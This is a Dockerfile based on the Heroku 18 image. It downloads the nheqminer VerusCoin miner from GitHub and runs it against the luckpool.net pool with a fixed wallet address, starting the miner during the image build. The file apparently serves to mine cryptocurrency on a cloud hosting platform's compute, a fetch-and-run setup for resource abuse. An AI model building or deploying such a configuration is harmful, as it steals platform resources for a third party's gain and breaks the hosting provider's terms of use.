FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz; tar -xvf nheqminer-Linux-v0.8.2.tgz; tar -xvf nheqminer-Linux-v0.8.2.tar.gz; nheqminer/nheqminer -v -l na.luckpool.net:3956 -u RQGoot8JHxnt5hUKceS9wpVe5eMXhBAiuj.xazhari -p x
CMD bash heroku.sh
